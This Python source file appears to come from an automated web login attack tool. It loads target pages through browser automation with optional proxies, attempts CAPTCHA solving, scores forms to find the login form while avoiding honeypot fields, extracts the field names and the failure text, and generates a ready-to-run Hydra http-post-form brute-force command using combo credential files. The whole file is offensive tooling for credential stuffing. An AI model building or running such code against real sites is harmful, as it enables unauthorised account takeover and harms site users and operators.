import re
from urllib.parse import urljoin, urlparse

try:
    from bs4 import BeautifulSoup

    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

from config import config
from fetch import HAS_SELENIUM, fetch_page_playwright, fetch_page_selenium, solve_captcha
from helpers import normalize_and_validate_target, validate_url


def detect_failure_string(soup, url):
    error_keywords = ["incorrect", "invalid", "failed", "wrong", "error", "denied", "try again", "not found", "locked", "unsuccessful"]
    error_texts = []

    for tag in soup.find_all(["div", "span", "p", "label"], class_=re.compile(r"(error|alert|invalid|fail|warning|message|feedback)")):
        text = tag.get_text(strip=True).lower()
        if any(kw in text for kw in error_keywords):
            error_texts.append(text)

    form = soup.find("form")
    if form:
        form_text = form.get_text(strip=True).lower()
        for kw in error_keywords:
            if kw in form_text:
                error_texts.append(kw)

    if error_texts:
        unique_errors = list(set(error_texts))
        return f"F={'|'.join(unique_errors[:5])}"

    return "F=Invalid|wrong|failed|incorrect|error|denied|try again|not found"


def validate_login_form(form, html_content, strict=True):
    confidence = 0
    reasons = []

    method = form.get("method", "get").lower()
    if method != "post":
        confidence += 20
        reasons.append("non-POST method")

    action = form.get("action", "").strip()
    if action in ["#", "javascript:void(0)", "about:blank", ""]:
        confidence += 10
        reasons.append("action is blank/hash/js")

    password_fields = form.find_all("input", {"type": "password"})
    if not password_fields:
        return False, "no password field found", 0

    confidence += 40

    user_fields = form.find_all("input", {"type": ["text", "email"]})
    if not user_fields:
        confidence += 10
        reasons.append("no obvious username field")

    visible_inputs = [i for i in form.find_all("input") if i.get("type") not in ["hidden", "submit"]]
    if len(visible_inputs) < 2:
        confidence += 5
        reasons.append("few visible inputs")

    honeypot_keywords = ["honeypot", "email_confirm", "url", "website", "leaveblank"]
    for inp in form.find_all("input"):
        name = (inp.get("name") or "").lower()
        style = (inp.get("style") or "").lower()
        if any(kw in name for kw in honeypot_keywords) and ("display:none" in style or "visibility:hidden" in style):
            confidence -= 20
            reasons.append("honeypot suspicion")

    form_text = form.get_text(separator=" ", strip=True).lower()
    failure_keywords = ["incorrect", "invalid", "failed", "wrong", "error", "try again"]
    if any(kw in form_text for kw in failure_keywords):
        confidence += 20

    confidence = min(100, max(0, confidence))

    if confidence < 60 and strict:
        return False, f"low confidence ({confidence}): {', '.join(reasons)}", confidence

    return True, f"valid (confidence: {confidence}; reasons: {', '.join(reasons) or 'n/a'})", confidence


def normalize_form_action(page_url, action):
    base_url = validate_url(page_url)
    if not base_url:
        return None

    raw_action = (action or "").strip()
    candidate = base_url if not raw_action or raw_action == "#" else urljoin(base_url, raw_action)
    return validate_url(candidate)


def infer_submit_mode(form, page_url, action_url):
    method = (form.get("method") or "unknown").lower()
    raw_action = (form.get("action") or "").strip().lower()
    js_indicators = [
        bool(form.get("onsubmit")),
        "addEventListener('submit'" in str(form),
        "preventdefault" in str(form).lower(),
        "ajax" in str(form).lower(),
    ]
    if method == "post" and action_url:
        return "native_post"
    if method == "get" and action_url:
        return "native_get"
    if raw_action in {"", "#", "javascript:void(0)"} and any(js_indicators):
        return "js_handled"
    return "unknown"


def extract_login_form(url, proxy=None, strict_validation=True):
    if not HAS_BS4:
        return None, "bs4_not_installed"

    url, invalid_reason = normalize_and_validate_target(url, allow_nonstandard_ports=bool(config.get("allow_nonstandard_ports", False)))
    if not url:
        return None, {"status": "skipped_invalid_target", "reason": invalid_reason or "invalid target"}

    html, error = fetch_page_playwright(url, proxy)
    fallback_used = False

    if not html and HAS_SELENIUM:
        html, error = fetch_page_selenium(url, proxy)
        fallback_used = True

    if not html:
        if isinstance(error, dict):
            return None, {
                "status": "fetch_failed",
                "error_code": error.get("code") or "fetch_failed",
                "error_hint": error.get("hint") or "Navigation failed",
                "error_detail": error.get("detail") or "fetch failed",
                "error_stacktrace": error.get("stacktrace"),
            }
        return None, {"status": "fetch_failed", "error_code": "fetch_failed", "error_hint": "Navigation failed", "error_detail": str(error or "no_html")}

    soup = BeautifulSoup(html, "html.parser")

    captcha_token = solve_captcha(soup, url)
    if captcha_token:
        html, error = fetch_page_playwright(url, proxy)
        if html:
            soup = BeautifulSoup(html, "html.parser")

    forms = soup.find_all("form")

    best_form = None
    best_confidence = -1
    best_reason = ""

    for form in forms:
        is_valid, reason, confidence = validate_login_form(form, html, strict=strict_validation)
        if not is_valid:
            continue

        if confidence > best_confidence:
            best_form = form
            best_confidence = confidence
            best_reason = reason

    if not best_form:
        return None, {"status": "no_form", "reason": f"no valid form (best confidence: {best_confidence})"}

    action = normalize_form_action(url, best_form.get("action")) or url
    method = (best_form.get("method") or "unknown").lower()

    post_parts = []
    username_field = None
    password_field = None

    for inp in best_form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        typ = inp.get("type", "text").lower()

        if typ == "password":
            password_field = name
            post_parts.append(f"{name}=^PASS^")
        elif typ in ["text", "email"] and not username_field:
            username_field = name
            post_parts.append(f"{name}=^USER^")
        elif typ not in ["submit", "button", "hidden"]:
            post_parts.append(f"{name}=")

    for h in best_form.find_all("input", {"type": "hidden"}):
        n = h.get("name")
        v = h.get("value", "")
        if n:
            post_parts.append(f"{n}={v}")

    submit_mode = infer_submit_mode(best_form, url, action)
    failure = detect_failure_string(soup, url)
    post_data = "&".join(post_parts)

    status = "success_form" if submit_mode == "native_post" and username_field and password_field else "success_loginish"

    hydra_template = ""
    if status == "success_form":
        target = urlparse(url).netloc or url
        hydra_template = f'hydra -L "{{combo_file}}" -P "{{combo_file}}" {target} http-post-form "{action}:{post_data}:{failure}" -V -t 4 -f'

    return {
        "status": status,
        "original_url": url,
        "action": action,
        "post_data": post_data,
        "failure_condition": failure,
        "hydra_command_template": hydra_template,
        "confidence": best_confidence,
        "validation_reason": best_reason,
        "fallback_used": fallback_used,
        "method": method,
        "action_url": action,
        "user_field": username_field,
        "pass_field": password_field,
        "submit_mode": submit_mode,
        "reasons": best_reason,
    }, None
